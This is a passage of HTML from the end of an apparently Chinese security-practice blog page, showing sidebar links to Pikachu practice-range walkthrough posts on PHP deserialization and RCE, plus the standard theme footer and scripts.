onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：PHP反序列化"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-PHP-Unserialize/" title="Pikachu靶场通关：PHP反序列化">Pikachu靶场通关：PHP反序列化</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-RCE/" title="Pikachu靶场通关：RCE"><img src="/img/cover-6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：RCE"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-RCE/" title="Pikachu靶场通关：RCE">Pikachu靶场通关：RCE</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Qu0rtz-blip</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.2"></script><script src="/js/main.js?v=5.7.2"></script><div class="js-pjax"></div><script src="/js/click-effect.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
